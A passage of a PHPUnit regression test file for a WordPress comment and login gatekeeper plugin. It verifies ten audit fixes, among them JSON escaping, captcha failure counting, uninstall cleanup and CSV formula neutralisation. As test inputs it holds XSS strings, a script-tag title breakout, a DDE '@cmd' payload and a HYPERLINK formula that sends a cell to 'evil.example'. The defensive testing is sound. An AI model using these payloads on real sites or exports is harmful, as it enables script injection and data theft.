<?php
/**
 * AUDIT-FIX 轻量批回归门（2026-11-20；独立审计 docs/reports/AUDIT-INDEP-2026-11/REPORT.md
 * 裁定的轻量/P0 级+含前端面修复十件——TDD 先红后绿，本文件即红批载体）。
 *
 * 十件与审计条目号对照：
 *   ① P1-1（S1-F1/P3-F2）AJAX 拦截响应 JSON 无 Content-Type + LLM reason 直通
 *      → ResponseDispatcher::ajax_reject_headers() 补 Content-Type: application/json;
 *        charset=utf-8 + ResponseDispatcher::ajax_body_json()（encoder 注入）JSON_HEX 族。
 *   ② P1-2（S6-F1）登录验证码摊销——VerifyCache 窗内口令错误计次，错 ≥5 吊销 wk_cv_ 键；
 *      成功登录清计数（LoginGate 纯逻辑面 record_verify_cache_password_failure）。
 *   ③ P1-9（S4-F1）option autoload 漂移无再断言——Bootstrap admin_init 幂等自愈
 *      （settings+stats；仅现值非 'off' 执行）+ SettingsPage 写点补第三参（probe_log）。
 *   ④ P3-F5/A1-F9/F11 uninstall 漏 wk_baidu_token_ 前缀（11→12）+ 头注 option 计数 12→13
 *      + OptionHygieneTest 契约钉翻转（翻转面在既有文件）。
 *   ⑤ S4-F6 百度清除/换钥不删旧 token transient——sanitize 桥
 *      SettingsPage::maybe_delete_baidu_token_transient（BaiduTextModerationDriver::
 *      token_cache_key 指纹派生 + WinkGatekeeper\Settings\delete_transient 桩行为断言）。
 *   ⑥ S1-F2 CSV 原因列公式注入——InterceptDigest::neutralize_csv_formula（=+-@/制表符
 *      前缀单引号中和，导出行组装全列消费）。
 *   ⑦ S1-F3 wp_die title 未转义——CommentGate:intercept_result / DiePage:show 两调用点
 *      esc_html( $title )（source-scan 钉）。
 *   ⑧ S6-F2 信用缓存键缺昵称——wk_tc_ 游客键并入昵称维（'g:'+email+'|'+author）；
 *      invalidate 增 author 参（既有 CommentTrustTest 契约翻转在既有文件）。
 *   ⑨ P0-E1② CDN 代理头告警黄条——IpResolver::proxy_header_conflict 纯函数（headers 数组
 *      入→bool 出；vendor 无关不写死网段）+ Tab④ 页顶 notice_yellow_bar 黄条
 *      + 仪表盘 Widget 站务提醒位（两渲染面 source-scan 钉）。
 *   ⑩ P1-8（仅条件件）前台资产入队条件 is_singular() && comments_open()（WP 条件桩行为
 *      测试：评论页仍载/非文章页与评论关闭页不载；登录链不经该条件 source-scan 钉）。
 *
 * 路径纪律（bc5e3c5 教训）：本文件全部 source-scan 路径字面量逐段 case-sensitive 对照
 * 真实文件树（includes/、includes/gates/、includes/ip/、includes/settings/、
 * includes/stats/、includes/intercept/、includes/drivers/review/）。
 *
 * @package WinkGatekeeper\Tests
 */

namespace WinkGatekeeper {

	/* ---------------------------------------------------------------
	 * WP 条件/资产桩（⑩ P1-8 行为级测试承载面——仅本批新增消费面：
	 * enqueue_front_assets 的 is_singular/comments_open 与 WP 资产 API；
	 * WinkGatekeeper 命名空间内先解析=先例同款「命名空间桩」机制）。
	 * --------------------------------------------------------------- */
	if ( ! defined( 'WINK_GATEKEEPER_VERSION' ) ) {
		define( 'WINK_GATEKEEPER_VERSION', 'auditfix-test' ); // ⑩ 行为级测试需常量在场（真实值由生产入口定义）。
	}

	if ( ! function_exists( 'WinkGatekeeper\is_singular' ) ) {
		/**
		 * is_singular 桩（可编程——WpFrontAssetStub::$singular）。
		 *
		 * @return bool
		 */
		function is_singular(): bool {
			return \WinkGatekeeper\Tests\WpFrontAssetStub::$singular;
		}
	}

	if ( ! function_exists( 'WinkGatekeeper\comments_open' ) ) {
		/**
		 * comments_open 桩（可编程——WpFrontAssetStub::$comments_open）。
		 *
		 * @return bool
		 */
		function comments_open(): bool {
			return \WinkGatekeeper\Tests\WpFrontAssetStub::$comments_open;
		}
	}

	if ( ! function_exists( 'WinkGatekeeper\wp_register_style' ) ) {
		/**
		 * wp_register_style 桩（仅记录 handle——登记不计入 enqueued 面）。
		 *
		 * @param string $handle handle。
		 * @return void
		 */
		function wp_register_style( string $handle ): void {
			\WinkGatekeeper\Tests\WpFrontAssetStub::$registered[] = $handle;
		}
	}

	if ( ! function_exists( 'WinkGatekeeper\wp_register_script' ) ) {
		/**
		 * wp_register_script 桩（仅记录 handle——登记不计入 enqueued 面）。
		 *
		 * @param string $handle handle。
		 * @return void
		 */
		function wp_register_script( string $handle ): void {
			\WinkGatekeeper\Tests\WpFrontAssetStub::$registered[] = $handle;
		}
	}

	if ( ! function_exists( 'WinkGatekeeper\wp_localize_script' ) ) {
		/**
		 * wp_localize_script 桩（记录 handle——l10n 数据不消费）。
		 *
		 * @param string $handle handle。
		 * @return void
		 */
		function wp_localize_script( string $handle ): void {
			\WinkGatekeeper\Tests\WpFrontAssetStub::$registered[] = $handle;
		}
	}

	if ( ! function_exists( 'WinkGatekeeper\wp_enqueue_style' ) ) {
		/**
		 * wp_enqueue_style 桩（记录 enqueued——⑩ 断言面）。
		 *
		 * @param string $handle handle。
		 * @return void
		 */
		function wp_enqueue_style( string $handle ): void {
			\WinkGatekeeper\Tests\WpFrontAssetStub::$enqueued_styles[] = $handle;
		}
	}

	if ( ! function_exists( 'WinkGatekeeper\wp_enqueue_script' ) ) {
		/**
		 * wp_enqueue_script 桩（记录 enqueued——⑩ 断言面）。
		 *
		 * @param string $handle handle。
		 * @return void
		 */
		function wp_enqueue_script( string $handle ): void {
			\WinkGatekeeper\Tests\WpFrontAssetStub::$enqueued_scripts[] = $handle;
		}
	}

	if ( ! function_exists( 'WinkGatekeeper\__' ) ) {
		/**
		 * __ 桩（identity——front_l10n 译文基线即默认译文；W3HelpersTest 同款机制）。
		 *
		 * @param string $text   原文。
		 * @param string $domain 文本域（桩忽略）。
		 * @return string
		 */
		function __( string $text, string $domain = 'wink-wp-gatekeeper' ): string {
			unset( $domain );
			return $text;
		}
	}
}

namespace WinkGatekeeper\Tests {

	use PHPUnit\Framework\TestCase;
	use WinkGatekeeper\Bootstrap;
	use WinkGatekeeper\Drivers\Review\BaiduTextModerationDriver;
	use WinkGatekeeper\Gates\CommentGate;
	use WinkGatekeeper\Gates\CommentTrust;
	use WinkGatekeeper\Gates\LoginCounters;
	use WinkGatekeeper\Gates\LoginGate;
	use WinkGatekeeper\Gates\VerifyCache;
	use WinkGatekeeper\Intercept\DiePage;
	use WinkGatekeeper\Intercept\Copywork;
	use WinkGatekeeper\Ip\IpResolver;
	use WinkGatekeeper\Settings\SettingsPage;
	use WinkGatekeeper\Stats\InterceptDigest;
	use WinkGatekeeper\Gates\ResponseDispatcher;

	/**
	 * ⑩ P1-8 行为级 WP 条件/资产桩可编程面（逐测自清理）。
	 */
	final class WpFrontAssetStub {

		/**
		 * @var bool is_singular 桩返回值。
		 */
		public static bool $singular = true;

		/**
		 * @var bool comments_open 桩返回值。
		 */
		public static bool $comments_open = true;

		/**
		 * @var string[] 登记记录（register/localize——非 enqueue 面）。
		 */
		public static array $registered = array();

		/**
		 * @var string[] 已入队样式 handle。
		 */
		public static array $enqueued_styles = array();

		/**
		 * @var string[] 已入队脚本 handle。
		 */
		public static array $enqueued_scripts = array();

		/**
		 * 逐测自清理。
		 *
		 * @return void
		 */
		public static function reset(): void {
			self::$singular         = true;
			self::$comments_open    = true;
			self::$registered       = array();
			self::$enqueued_styles  = array();
			self::$enqueued_scripts = array();
		}
	}

	final class AuditFixBatchTest extends TestCase {

		/**
		 * 固定 HMAC（生产 = wp_salt('auth') 派生；测试注入固定函数——VerifyCacheTest 同款）。
		 *
		 * @var callable
		 */
		private static $mac;

		public static function setUpBeforeClass(): void {
			self::$mac = static function ( string $data ): string {
				return hash_hmac( 'sha256', $data, 'auditfix-batch-key' );
			};
		}

		protected function setUp(): void {
			WpFrontAssetStub::reset();
			\WinkGatekeeper\Tests\WpOptionStub::reset();
		}

		/**
		 * 源文件读取（路径字面量逐段 case-sensitive 对照真实文件树——bc5e3c5 教训）。
		 *
		 * @param string $rel 相对仓库根路径。
		 * @return string
		 */
		private static function src( string $rel ): string {
			$raw = file_get_contents( dirname( __DIR__ ) . '/' . $rel );
			self::assertIsString( $raw, "{$rel} 必须可读" );
			return (string) $raw;
		}

		/**
		 * VerifyCache 三件套工厂（含删除记录——② P1-2 行为级承载）。
		 *
		 * @param int    $minutes 窗口分钟。
		 * @param array  $store   内存 store（引用）。
		 * @param string[] $dels 删除记录（引用——实际同步 unset）。
		 * @return VerifyCache
		 */
		private static function cache_full( int $minutes, array &$store, array &$dels ): VerifyCache {
			return new VerifyCache(
				$minutes,
				static function ( string $key ) use ( &$store ) {
					return array_key_exists( $key, $store ) ? $store[ $key ] : null;
				},
				static function ( string $key, $value, int $ttl ) use ( &$store ): void {
					$store[ $key ] = $value;
				},
				self::$mac,
				static function ( string $key ) use ( &$store, &$dels ): void {
					$dels[]        = $key;
					unset( $store[ $key ] );
				}
			);
		}

		/* ===============================================================
		 * ① P1-1（S1-F1/P3-F2）AJAX 拦截响应 JSON 面
		 * =============================================================== */

		public function test_p1_1_ajax_reject_headers_carry_content_type(): void {
			$result  = array(
				'message'  => 'One wink missing',
				'evidence' => array( 'Matched rule' => 'captcha_missing' ),
			);
			$headers = ResponseDispatcher::ajax_reject_headers( $result, 'comment' );

			$this->assertSame( 'application/json; charset=utf-8', $headers['Content-Type'], 'AJAX 拦截响应必须自带 JSON 类型头（admin-ajax 恒 text/html——S1-F1 sink 收口）' );
			$this->assertSame( 'comment', $headers['X-Wink-Gatekeeper-Scene'], '四头协议保留' );
			$this->assertSame( 'required', $headers['X-Wink-Gatekeeper-Error'], '四头协议保留' );
			$this->assertSame( 'captcha_missing', $headers['X-Wink-Gatekeeper-Code'], '四头协议保留' );
		}

		public function test_p1_1_rest_error_headers_stay_four_header_protocol(): void {
			$result  = array( 'evidence' => array( 'Matched rule' => 'bad-signature' ) );
			$headers = ResponseDispatcher::rest_error_headers( $result, 'comment' );
			$this->assertArrayNotHasKey( 'Content-Type', $headers, 'REST 分支不加 Content-Type（WP REST 层强制 application/json——重复头面不引入）' );
			$this->assertCount( 4, $headers, 'REST 补头协议维持四头' );
		}

		public function test_p1_1_ajax_body_json_hex_escapes_reason(): void {
			$result = array(
				'message'  => '拦下了',
				'evidence' => array( 'Matched rule' => '<img src=x onerror=alert(document.domain)> "quoted" & amp \'apos' ),
			);
			$json   = ResponseDispatcher::ajax_body_json( $result, 'comment', false, 'json_encode' );

			$this->assertStringNotContainsString( '<img', $json, 'JSON_HEX_TAG：标签字面不得出现在响应串（text/html 宿主下不可执行）' );
			$this->assertStringNotContainsString( '>', $json, 'JSON_HEX_TAG：> 转义' );
			$this->assertStringNotContainsString( '&', $json, 'JSON_HEX_AMP：& 转义' );
			$this->assertStringNotContainsString( "'", $json, 'JSON_HEX_APOS：单引号转义' );
			$this->assertStringNotContainsString( '"quoted"', $json, 'JSON_HEX_QUOT：双引号字面不出现在值内（包裹引号除外——解体后核）' );
			$this->assertStringContainsString( '\u003C', $json, 'HEX 形态在位' );

			$decoded = json_decode( $json, true );
			$this->assertIsArray( $decoded );
			$this->assertFalse( $decoded['success'], 'WP AJAX 约定形态保留（success:false）' );
			$this->assertSame( '<img src=x onerror=alert(document.domain)> "quoted" & amp \'apos', $decoded['data']['code'], '解码还原原值——JSON 语义不变（消费方解析面不受影响）' );
		}

		public function test_p1_1_body_json_flags_constant_value(): void {
			$this->assertSame(
				JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT,
				ResponseDispatcher::BODY_JSON_FLAGS,
				'JSON_HEX 四旗闭集（审计修复方向原句——缺一即白名单面破口）'
			);
		}

		public function test_p1_1_comment_gate_ajax_branch_consumes_dispatcher_json(): void {
			$src = self::src( 'includes/gates/CommentGate.php' );
			$this->assertStringContainsString( 'ResponseDispatcher::ajax_reject_headers( $result, $this->id )', $src, 'AJAX 分支头协议改走 ResponseDispatcher 收口件（Content-Type+四头）' );
			$this->assertStringContainsString( 'ResponseDispatcher::ajax_body_json( $result, $this->id, $sent', $src, 'AJAX 分支 JSON 输出改走 ajax_body_json（JSON_HEX 族）' );
			$this->assertStringNotContainsString( 'echo wp_json_encode( ResponseDispatcher::ajax_body(', $src, '裸 echo wp_json_encode 形态退役（S1-F1 sink 不再原样直通）' );
		}

		/* ===============================================================
		 * ② P1-2（S6-F1）登录验证码摊销
		 * =============================================================== */

		public function test_p1_2_password_failure_counter_bumps_then_revokes_at_five(): void {
			$store = array();
			$dels  = array();
			$cache = self::cache_full( 10, $store, $dels );
			$cache->remember( 'STUB_A', '203.0.113.7' ); // 过一次码 → 窗开。
			$cache_key = VerifyCache::key( 'STUB_A', '203.0.113.7', self::$mac );
			$this->assertTrue( $cache->hit( 'STUB_A', '203.0.113.7' ), '前置：窗内命中' );

			$revoked = array();
			for ( $i = 1; $i <= 4; $i++ ) {
				$revoked[] = $cache->record_password_failure( 'STUB_A', '203.0.113.7' );
			}
			$this->assertSame( array( false, false, false, false ), $revoked, '阈 5：前 4 次错误不吊销（真人手滑不误伤）' );
			$this->assertTrue( $cache->hit( 'STUB_A', '203.0.113.7' ), '前 4 次：窗仍开（摊销攻击面收窄但窗口保留）' );

			$revoked[] = $cache->record_password_failure( 'STUB_A', '203.0.113.7' );
			$this->assertSame( array( false, false, false, false, true ), $revoked, '第 5 次错误 → 吊销（S6-F1 修复口径）' );
			$this->assertFalse( $cache->hit( 'STUB_A', '203.0.113.7' ), '吊销后 wk_cv_ 键已删——后续提交须重新过码' );
			$this->assertContains( $cache_key, $dels, '删除落点=该 wk_cv_ 缓存键' );
		}

		public function test_p1_2_counter_key_is_wk_cv_family_covered_by_uninstall(): void {
			$counter_key = 'wk_cv_f_' . substr( (string) ( self::$mac )( 'STUB_A|203.0.113.7' ), 0, 16 );
			$store = array();
			$dels  = array();
			$cache = self::cache_full( 10, $store, $dels );
			$cache->remember( 'STUB_A', '203.0.113.7' );
			$cache->record_password_failure( 'STUB_A', '203.0.113.7' );

			$fails = array_filter( array_keys( $store ), static function ( string $key ): bool {
				return 0 === strpos( $key, 'wk_cv_f_' );
			} );
			$this->assertNotEmpty( $fails, '计次键落 wk_cv_f_ 族（uninstall wk_cv_ 前缀天然覆盖——不新增卸载清单面）' );
			$this->assertSame( $counter_key, array_values( $fails )[0], '计次键=前缀+同 HMAC 指纹（与缓存键同存根|IP 绑定）' );
		}

		public function test_p1_2_counter_disabled_when_window_off(): void {
			$store = array();
			$dels  = array();
			$cache = self::cache_full( 0, $store, $dels ); // verify_cache_minutes=0 = 停用。
			$this->assertFalse( $cache->record_password_failure( 'STUB_A', '203.0.113.7' ), '窗停用（0 分钟）=无摊销窗=零计次零吊销' );
			$this->assertSame( array(), $dels );
		}

		public function test_p1_2_successful_login_clears_counter(): void {
			$store = array();
			$dels  = array();
			$cache = self::cache_full( 10, $store, $dels );
			$cache->remember( 'STUB_A', '203.0.113.7' );
			$cache->record_password_failure( 'STUB_A', '203.0.113.7' );
			$cache->record_password_failure( 'STUB_A', '203.0.113.7' );

			$cache->clear_password_failures( 'STUB_A', '203.0.113.7' );

			$fails = array_filter( array_keys( $store ), static function ( string $key ): bool {
				return 0 === strpos( $key, 'wk_cv_f_' );
			} );
			$this->assertSame( array(), $fails, '成功登录清计数（真人口令手滑→成功的正常路径零残余）' );

			// 清计数后再错 4 次（而非 4 次满阈）不吊销——计数不跨累计。
			for ( $i = 1; $i <= 4; $i++ ) {
				$this->assertFalse( $cache->record_password_failure( 'STUB_A', '203.0.113.7' ), '清零后重新起算' );
			}
			$this->assertTrue( $cache->hit( 'STUB_A', '203.0.113.7' ), '窗未误吊销' );
		}

		public function test_p1_2_counter_bound_to_stub_and_ip(): void {
			$store = array();
			$dels  = array();
			$cache = self::cache_full( 10, $store, $dels );
			$cache->remember( 'STUB_A', '203.0.113.7' );
			for ( $i = 0; $i < 4; $i++ ) {
				$cache->record_password_failure( 'STUB_A', '203.0.113.7' );
			}
			$this->assertFalse( $cache->record_password_failure( 'STUB_B', '203.0.113.7' ), '换存根=新计数（键双绑定——不跨表单会话累计）' );
			$this->assertFalse( $cache->record_password_failure( 'STUB_A', '198.51.100.5' ), '换 IP=新计数（不跨源累计）' );
		}

		public function test_p1_2_login_gate_pure_face_delegates_to_verify_cache(): void {
			$store = array();
			$dels  = array();
			$cache = self::cache_full( 10, $store, $dels );
			$cache->remember( 'STUB_A', '203.0.113.7' );

			$gate = new LoginGate(
				array(
					'gates'   => array( 'login' => array( 'enabled' => true, 'render_mode' => 'adaptive' ) ),
					'captcha' => array( 'login_adaptive' => array() ),
				),
				null,
				null,
				null,
				null,
				null,
				new LoginCounters( array() ),
				$cache
			);

			$gate->record_verify_cache_password_failure( '203.0.113.7', 'STUB_A' );
			$gate->record_verify_cache_password_failure( '203.0.113.7', 'STUB_A' );
			$fails = array_filter( array_keys( $store ), static function ( string $key ): bool {
				return 0 === strpos( $key, 'wk_cv_f_' );
			} );
			$this->assertCount( 1, $fails, '纯逻辑面委托 VerifyCache 计次（hook_wp_login_failed 边界消费——incorrect_password 才调）' );

			$gate->clear_verify_cache_failures( '203.0.113.7', 'STUB_A' );
			$fails = array_filter( array_keys( $store ), static function ( string $key ): bool {
				return 0 === strpos( $key, 'wk_cv_f_' );
			} );
			$this->assertSame( array(), $fails, '纯逻辑面委托清计数（hook_wp_login 边界消费）' );
		}

		public function test_p1_2_login_gate_boundary_wiring_source_scan(): void {
			$src = self::src( 'includes/gates/LoginGate.php' );
			$this->assertStringContainsString( 'incorrect_password', $src, 'hook_wp_login_failed 边界只对口令错误计次（本闸拒绝码不算——不惩罚已过码真人）' );
			$this->assertStringContainsString( 'record_verify_cache_password_failure', $src, '失败边界消费纯逻辑面' );
			$this->assertStringContainsString( 'clear_verify_cache_failures', $src, '成功登录（wp_login）边界清计数' );
		}

		/* ===============================================================
		 * ③ P1-9（S4-F1）option autoload 漂移无再断言
		 * =============================================================== */

		public function test_p1_9_bootstrap_heals_option_autoload_on_admin_init(): void {
			$src = self::src( 'includes/Bootstrap.php' );
			$this->assertStringContainsString( "add_action( 'admin_init', array( \$this, 'heal_option_autoload' ) )", $src, '自愈挂 admin_init（写链漂移面唯一通道=管理上下文；前台零新增查询）' );
			$this->assertStringContainsString( 'wp_set_option_autoload', $src, '幂等断言走 WP 6.4+ 规范件' );
			$this->assertStringContainsString( "function_exists( 'wp_set_option_autoload' )", $src, 'WP 6.0-6.3 守卫（Requires at least 6.0）' );
			$this->assertStringContainsString( 'SettingsPage::OPTION_NAME', $src, 'settings 主 option 自愈' );
			$this->assertStringContainsString( 'StatsCache::OPTION_NAME', $src, 'stats 同族活体自愈（P3 复位遗留 autoload=auto 实锤面）' );
			$this->assertStringContainsString( "'off'", $src, '现值已 off = 零写（防每请求写）' );
		}

		public function test_p1_9_probe_log_write_point_carries_autoload_false(): void {
			$src = self::src( 'includes/settings/SettingsPage.php' );
			$this->assertStringContainsString( 'update_option( self::OPTION_PROBE_LOG, $log, false )', $src, 'probe_log 写点补第三参 false（S4-F2 确定性漂移口——首次探测即 auto 重建）' );
		}

		public function test_p1_9_settings_page_update_options_all_carry_false(): void {
			$src    = self::src( 'includes/settings/SettingsPage.php' );
			$count  = preg_match_all( '/update_option\([^\n]*\);/', $src, $matches );
			$this->assertGreaterThan( 0, $count, 'SettingsPage 写点在场' );
			foreach ( $matches[0] as $line ) {
				$this->assertStringEndsWith( ', false );', $line, '涉密/状态 option 写点全量 autoload=false（漂移再断言面——发现行：' . $line . ')' );
			}
		}

		/* ===============================================================
		 * ④ P3-F5/A1-F9/F11 uninstall 前缀+头注计数
		 * =============================================================== */

		public function test_p4_uninstall_prefix_list_contains_baidu_token(): void {
			$src = self::src( 'uninstall.php' );
			$this->assertStringContainsString( "'wk_baidu_token_'", $src, '步骤 4 前缀清单补 wk_baidu_token_（P3-F5/A1-F9——表存储形态卸载后 token 残留 30 天口）' );
		}

		public function test_p4_uninstall_transient_prefix_closed_set_of_twelve(): void {
			$src     = self::src( 'uninstall.php' );
			$matched = preg_match( '/foreach \( array\(([^)]*)\) as \$wink_transient_prefix/', $src, $m );
			$this->assertSame( 1, $matched, '步骤 4 前缀数组字面在场' );

			$raw     = trim( (string) $m[1] );
			$entries = array_filter( array_map( 'trim', explode( ',', $raw ) ) );
			$expected = array(
				"'wk_lf_'",
				"'wk_ip_'",
				"'wk_rp_'",
				"'wk_cv_'",
				"'wk_pk_'",
				"'wk_tc_'",
				"'wk_cm_'",
				"'wk_cai_'",
				"'wk_cag_'",
				"'wk_irb_'",
				"'wk_ua_'",
				"'wk_es_'",
				"'wk_ec_log_'",
				"'wk_baidu_token_'",
			);
			$this->assertCount( 14, $entries, '前缀清单 12→14（批1·P1-4 留档容量闸日桶 wk_cai_/wk_cag_ 补录口径）' );
			$this->assertSame( array_values( $expected ), array_values( $entries ), '前缀闭集全等（14 前缀，逐项精确——禁宽匹配纪律保持）' );
		}

		public function test_p4_uninstall_header_documents_thirteen_options(): void {
			$src = self::src( 'uninstall.php' );
			$this->assertStringContainsString( '13 个 option', $src, '头注 option 计数 12→13（A1-F11——实际 delete_option 13 处，注释漂移修正）' );
			$this->assertStringNotContainsString( '删 12 个 option', $src, '旧计数退役' );
		}

		public function test_p4_uninstall_delete_option_count_is_thirteen(): void {
			$src   = self::src( 'uninstall.php' );
			$count = preg_match_all( "/delete_option\( '/", $src, $m ); // 字面名调用计数（transient 清理循环的动态 delete_option 不计——键名引用形态区分）。
			$this->assertSame( 13, $count, 'delete_option 实删数=13（头注同步面）' );
		}

		/* ===============================================================
		 * ⑤ S4-F6 百度清除/换钥联动删旧 token transient
		 * =============================================================== */

		public function test_p5_credential_rotation_deletes_old_token_transient(): void {
			$stored = array( 'review' => array( 'cloud' => array( 'baidu' => array( 'api_key' => 'AK-OLD', 'secret_key' => 'SK-1' ) ) ) );
			$merged = array( 'review' => array( 'cloud' => array( 'baidu' => array( 'api_key' => 'AK-NEW', 'secret_key' => 'SK-1' ) ) ) );

			self::invoke_baidu_token_heal( $stored, $merged );

			$this->assertSame(
				array( BaiduTextModerationDriver::token_cache_key( 'AK-OLD' ) ),
				\WinkGatekeeper\Tests\WpOptionStub::$deleted_transients,
				'换钥 → 旧 token transient 联动删除（键=wk_baidu_token_+旧 api_key 指纹——S4-F6）'
			);
		}

		public function test_p5_credential_clear_deletes_old_token_transient(): void {
			$stored = array( 'review' => array( 'cloud' => array( 'baidu' => array( 'api_key' => 'AK-OLD', 'secret_key' => 'SK-1' ) ) ) );
			$merged = array( 'review' => array( 'cloud' => array( 'baidu' => array( 'api_key' => '', 'secret_key' => '' ) ) ) );

			self::invoke_baidu_token_heal( $stored, $merged );

			$this->assertSame(
				array( BaiduTextModerationDriver::token_cache_key( 'AK-OLD' ) ),
				\WinkGatekeeper\Tests\WpOptionStub::$deleted_transients,
				'清除凭据 → 旧 access_token 不再残留至 30 天 TTL（清除语义联动派生凭证）'
			);
		}

		public function test_p5_secret_only_change_deletes_shared_key_transient(): void {
			$stored = array( 'review' => array( 'cloud' => array( 'baidu' => array( 'api_key' => 'AK-SAME', 'secret_key' => 'SK-OLD' ) ) ) );
			$merged = array( 'review' => array( 'cloud' => array( 'baidu' => array( 'api_key' => 'AK-SAME', 'secret_key' => 'SK-NEW' ) ) ) );

			self::invoke_baidu_token_heal( $stored, $merged );

			$this->assertSame(
				array( BaiduTextModerationDriver::token_cache_key( 'AK-SAME' ) ),
				\WinkGatekeeper\Tests\WpOptionStub::$deleted_transients,
				'仅换 Secret Key（同 API Key 键面）→ 该键 token 一并吊销'
			);
		}

		public function test_p5_unchanged_credentials_delete_nothing(): void {
			$tree = array( 'review' => array( 'cloud' => array( 'baidu' => array( 'api_key' => 'AK', 'secret_key' => 'SK' ) ) ) );

			self::invoke_baidu_token_heal( $tree, $tree );

			$this->assertSame( array(), \WinkGatekeeper\Tests\WpOptionStub::$deleted_transients, '凭据未变化=零联动（防每保存误删）' );
		}

		public function test_p5_first_configuration_deletes_nothing(): void {
			$stored = array();
			$merged = array( 'review' => array( 'cloud' => array( 'baidu' => array( 'api_key' => 'AK-NEW', 'secret_key' => 'SK-1' ) ) ) );

			self::invoke_baidu_token_heal( $stored, $merged );

			$this->assertSame( array(), \WinkGatekeeper\Tests\WpOptionStub::$deleted_transients, '首配（无旧凭据）=零联动——新键面无 token 可吊销' );
		}

		public function test_p5_sanitize_bridge_consumes_token_heal_source_scan(): void {
			$src = self::src( 'includes/settings/SettingsPage.php' );
			$this->assertStringContainsString( 'maybe_delete_baidu_token_transient( $stored, $merged )', $src, 'sanitize 桥收口消费（唯一 settings 写链——S4-F6 修复方向「保存桥检测值变化按旧值指纹删除」）' );
			$this->assertStringContainsString( 'BaiduTextModerationDriver::token_cache_key', $src, '键推导单一来源=驱动侧指纹函数（不重写第二套键推导）' );
			$this->assertStringContainsString( 'delete_transient(', $src, 'WP 边界删除面在场（命名空间桩承载行为断言）' );
		}

		/**
		 * 反射调用 SettingsPage::maybe_delete_baidu_token_transient（私有静态——行为级承载）。
		 *
		 * @param array<string, mixed> $stored 已存储树。
		 * @param array<string, mixed> $merged 合并后树。
		 * @return void
		 */
		private static function invoke_baidu_token_heal( array $stored, array $merged ): void {
			$method = new \ReflectionMethod( SettingsPage::class, 'maybe_delete_baidu_token_transient' );
			$method->invoke( null, $stored, $merged );
		}

		/* ===============================================================
		 * ⑥ S1-F2 CSV 原因列公式注入
		 * =============================================================== */

		public function test_p6_csv_formula_neutralize_matrix(): void {
			$this->assertSame( "'=HYPERLINK(\"http://evil\")", InterceptDigest::neutralize_csv_formula( '=HYPERLINK("http://evil")' ), '= 前缀中和' );
			$this->assertSame( "'+SUM(A1:A9)", InterceptDigest::neutralize_csv_formula( '+SUM(A1:A9)' ), '+ 前缀中和' );
			$this->assertSame( "'-1+2", InterceptDigest::neutralize_csv_formula( '-1+2' ), '- 前缀中和' );
			$this->assertSame( "'@cmd|'/c calc'!A1", InterceptDigest::neutralize_csv_formula( '@cmd|\'/c calc\'!A1' ), '@ 前缀中和（旧版 Excel DDE 形态）' );
			$this->assertSame( "'\ttab", InterceptDigest::neutralize_csv_formula( "\ttab" ), '制表符前缀中和（OWASP CSV 注入清单第五字符）' );
		}

		public function test_p6_csv_formula_neutralize_leaves_normal_cells_untouched(): void {
			$this->assertSame( '36-广告(subType=360101)', InterceptDigest::neutralize_csv_formula( '36-广告(subType=360101)' ), '数字开头=百度固定分类原样（既有导出行为零变化）' );
			$this->assertSame( '不合规:12-文本反作弊', InterceptDigest::neutralize_csv_formula( '不合规:12-文本反作弊' ), '中文开头原样' );
			$this->assertSame( 'WK-20261120-0001', InterceptDigest::neutralize_csv_formula( 'WK-20261120-0001' ), '事件编号原样' );
			$this->assertSame( '', InterceptDigest::neutralize_csv_formula( '' ), '空串原样' );
		}

		public function test_p6_export_csv_rows_neutralize_reason_column(): void {
			$rows = InterceptDigest::export_csv_rows( array(
				array(
					'event_no'   => 'WK-20261120-0001',
					'created_at' => '2026-11-20 10:00:00',
					'gate'       => 'review',
					'stage'      => 'captcha',
					'rule_hit'   => '=HYPERLINK("http://evil.example/?c="&A1,"点此")',
					'meta'       => array(),
				),
			) );

			$this->assertCount( 1, $rows );
			$this->assertStringStartsWith( "'=", $rows[0][3], '原因列（LLM hits 原样兜底可达面）公式前缀中和' );
			$this->assertStringStartsWith( 'WK-', $rows[0][4], '事件编号列不受中和影响' );
		}

		public function test_p6_export_csv_rows_all_columns_neutralized(): void {
			$rows = InterceptDigest::export_csv_rows( array(
				array(
					'event_no'   => '=WK-INJECT',
					'created_at' => '+2026-11-20 10:00:00',
					'gate'       => 'review',
					'stage'      => 'captcha',
					'rule_hit'   => '',
					'meta'       => array(),
				),
			) );

			$this->assertSame( "'+2026-11-20 10:00:00", $rows[0][0], '时间列同走中和件（防御纵深——非仅原因列）' );
			$this->assertSame( "'=WK-INJECT", $rows[0][4], '事件编号列同走中和件' );
		}

		/* ===============================================================
		 * ⑦ S1-F3 wp_die title 未转义
		 * =============================================================== */

		public function test_p7_comment_gate_die_title_escaped(): void {
			$src = self::src( 'includes/gates/CommentGate.php' );
			$this->assertStringContainsString( 'esc_html( $title ),', $src, 'wp_die 第二参 title 过 esc_html（core 不转义宿主骨架 <title>——S1-F3）' );
		}

		public function test_p7_die_page_show_title_escaped(): void {
			$src = self::src( 'includes/intercept/DiePage.php' );
			$this->assertStringContainsString( 'esc_html( $title ),', $src, 'DiePage::show 的 wp_die 第二参 title 过 esc_html' );
			$this->assertStringContainsString( 'wp_die(', $src, 'wp_die 调用点在场（修口=第二参包裹，不换页面构造器）' );
		}

		public function test_p7_die_page_build_pure_html_still_escapes_internally(): void {
			$html = DiePage::build(
				'</title><script>alert(1)</script>',
				'body',
				array( 'Event No.' => 'WK-20261120-0001' ),
				'',
				'',
				'zh-CN'
			);
			$this->assertStringNotContainsString( '<script>', $html, 'build() 内部转义在位（S1-F3 修的是 wp_die 外层第二参——build 既有契约不动）' );
		}

		/* ===============================================================
		 * ⑧ S6-F2 信用缓存键缺昵称
		 * =============================================================== */

		public function test_p8_guest_cache_key_carries_nickname_dimension(): void {
			$mac = self::$mac;
			$this->assertSame(
				'wk_tc_' . substr( (string) $mac( 'g:ops@example.com|老王' ), 0, 16 ),
				CommentTrust::cache_key( 'g', 'ops@example.com|老王', $mac ),
				'游客键键材并入昵称（g:+email+|+nick——S6-F2 修复方向原句）'
			);
		}

		public function test_p8_history_pass_guest_uses_email_plus_author_key(): void {
			$store = array();
			$puts  = array();
			$trust = $this->trust( $store, $puts );
			$mac   = self::$mac;

			$trust->history_pass( array( 'email' => 'Ops@Example.com', 'author' => '老王' ) );

			$this->assertNotEmpty( $puts, '缓存写入在场' );
			$this->assertSame(
				'wk_tc_' . substr( (string) $mac( 'g:ops@example.com|老王' ), 0, 16 ),
				$puts[0]['key'],
